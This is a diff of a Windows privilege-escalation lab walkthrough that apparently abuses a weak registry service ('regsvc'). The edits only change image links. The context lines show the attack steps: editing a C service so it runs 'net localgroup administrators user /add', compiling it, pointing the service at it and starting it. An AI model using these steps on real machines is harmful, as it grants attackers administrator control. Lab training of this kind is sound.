@@ -49,15 +49,13 @@ Password:
 ftp> put windows_service.c
 ```
 
-![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/234bc2e7-af11-462d-b119-18d130c204a1/f2285106-4ba4-4f0e-b345-fb7bf17b1b65/Untitled.png)
+![put](put.png)
 
 ## Step 3: Exploitation
 
----
-
 - Open `windows_service.c` in a text editor and replace the command used by the system() function to: **`cmd.exe /k net localgroup administrators user /add`**
 
-![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/234bc2e7-af11-462d-b119-18d130c204a1/9b17624f-5b27-4c94-9935-8afd0bbe15a0/Untitled.png)
+![edit](edit.png)
 
 - Compile the file by typing the following in the command prompt:
   - **`x86_64-w64-mingw32-gcc windows_service.c -o x.exe`**
@@ -71,7 +69,7 @@ ftp> put windows_service.c
 - Copy the generated file `x.exe`, to the target using the `pytfp` server
 - Make sure to use `binary` mode for the transfer process
 
-![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/234bc2e7-af11-462d-b119-18d130c204a1/562bea23-0730-408f-b0eb-ef0cf0aa8a0e/Untitled.png)
+![get](get.png)
 
 ### Add Executable to `ImagePath` of the Registry Service
 
@@ -95,4 +93,4 @@ C:\Temp> sc start regsvc
 C:\Temp> net localgroup administrators
 ```
 
-![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/234bc2e7-af11-462d-b119-18d130c204a1/a5f4d835-2eaf-4b65-90a6-7856e3449ecd/Untitled.png)
+![start](start.png)
